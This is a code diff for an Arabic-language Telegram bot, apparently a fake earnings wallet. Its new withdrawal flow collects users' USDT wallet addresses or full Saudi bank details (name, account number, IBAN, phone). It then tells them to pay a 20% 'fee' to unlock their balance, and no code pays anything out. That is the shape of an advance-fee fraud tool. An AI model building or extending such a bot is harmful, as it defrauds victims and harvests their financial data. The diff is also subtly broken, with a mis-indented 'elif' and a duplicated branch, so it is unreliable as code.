@@ -94,17 +94,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(f"📊 **محفظتك المالية:**\n\n🇸🇦 ريال: `{u['bal_sar']:,}`\n🇺🇸 دولار: `{u['bal_usd']:,}`", 
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
     
-    elif data == 'withdraw':
+ elif data == 'withdraw':
         u = get_user_data(uid)
-        # إذا كان الرصيد صفر في العملتين
-        if u['bal_sar'] <= 0 and u['bal_usd'] <= 0:
-            msg = "⚠️ رصيدك الحالي هو **0**.\nلا يمكنك السحب حالياً، ولكن يمكنك اختيار وسيلة السحب المفضلة لديك لمعرفة المتطلبات:"
-        else:
-            msg = (f"📊 **رصيدك المتاح للسحب:**\n\n"
-                   f"🇸🇦 ريال: `{u['bal_sar']:,}`\n"
-                   f"🇺🇸 دولار: `{u['bal_usd']:,}`\n\n"
-                   f"يرجى اختيار طريقة السحب:")
-
+        msg = (f"📤 **إجراءات سحب الأرباح**\n\n"
+               f"💰 **رصيدك الحالي:**\n"
+               f"🇸🇦: `{u['bal_sar']:,}` ﷼\n"
+               f"🇺🇸: `{u['bal_usd']:,}` $\n\n"
+               f"يرجى اختيار وسيلة السحب المطلوبة:")
         kb = [
             [InlineKeyboardButton("💵 سحب بالدولار (USDT)", callback_data='wd_usd')],
             [InlineKeyboardButton("🇸🇦 سحب بالريال السعودي", callback_data='wd_sar')],
@@ -113,13 +109,13 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
 
     elif data == 'wd_usd':
-        u = get_user_data(uid)
-        if u['bal_usd'] <= 0:
-            await query.edit_message_text("⚠️ رصيدك بالدولار هو **0**.\nيرجى إرسال عنوان محفظتك **TRC20 USDT** لحفظها في النظام:", 
-                                         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='withdraw')]]), parse_mode='Markdown')
-        else:
-            await query.edit_message_text("🎯 يرجى إرسال عنوان محفظتك **TRC20 USDT** مباشرة هنا في الدردشة:", parse_mode='Markdown')
-        context.user_data['waiting_for'] = 'usd_address'
+        await query.edit_message_text("🎯 **يرجى إرسال عنوان محفظتك (USDT TRC20) الآن:**", parse_mode='Markdown')
+        context.user_data['action'] = 'wait_usd'
+
+    elif data == 'wd_sar':
+        await query.edit_message_text("📝 **يرجى إرسال بياناتك البنكية بالتنسيق التالي:**\n\n"
+                                      "(اسم البنك - الاسم الكامل - رقم الحساب - الآيبان - رقم الجوال)", parse_mode='Markdown')
+        context.user_data['action'] = 'wait_sar'
 
     elif data == 'wd_sar':
         await query.edit_message_text("📝 يرجى إرسال بياناتك البنكية بالتنسيق التالي:\n\n(اسم البنك - الاسم الكامل - رقم الحساب - الآيبان - رقم الجوال)", parse_mode='Markdown')
@@ -177,11 +173,46 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode='Markdown'
             )
         except: pass
+async def handle_user_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    uid = update.effective_user.id
+    text = update.message.text
+    action = context.user_data.get('action')
 
+    if action == 'wait_usd':
+        u = get_user_data(uid)
+        balance = u['bal_usd']
+        fee = balance * 0.20  # حسبة الـ 20% تلقائياً
+        
+        response = (f"👤 **عزيزي المشترك**\n\n"
+                    f"💰 رصيدك بالدولار: `{balance:,} $`\n"
+                    f"📍 عنوان محفظتك: `{text}`\n"
+                    f"------------------------------\n"
+                    f"⚠️ **الرسوم المتوجبة (20%):** `{fee:,} $`\n"
+                    f"------------------------------\n"
+                    f"ℹ️ يرجى دفع مبلغ الرسوم لفتح بوابة تحويل الأرباح.")
+        await update.message.reply_text(response, parse_mode='Markdown')
+        context.user_data['action'] = None
+
+    elif action == 'wait_sar':
+        u = get_user_data(uid)
+        balance = u['bal_sar']
+        fee = balance * 0.20  # حسبة الـ 20% تلقائياً
+        
+        response = (f"👤 **عزيزي المشترك**\n\n"
+                    f"📋 بياناتك المستلمة:\n`{text}`\n\n"
+                    f"💰 رصيدك بالريال: `{balance:,} ﷼`\n"
+                    f"------------------------------\n"
+                    f"⚠️ **الرسوم المتوجبة لفتح بوابة السحب (20%):**\n"
+                    f"💳 المطلوب سداده: **`{fee:,} ﷼`**\n"
+                    f"------------------------------\n"
+                    f"ℹ️ يرجى دفع مبلغ الرسوم لفتح بوابة تحويل الأرباح.")
+        await update.message.reply_text(response, parse_mode='Markdown')
+        context.user_data['action'] = None
 if __name__ == '__main__':
     Thread(target=run_server, daemon=True).start()
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler('start', start))
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_input))
     app.run_polling(drop_pending_updates=True)
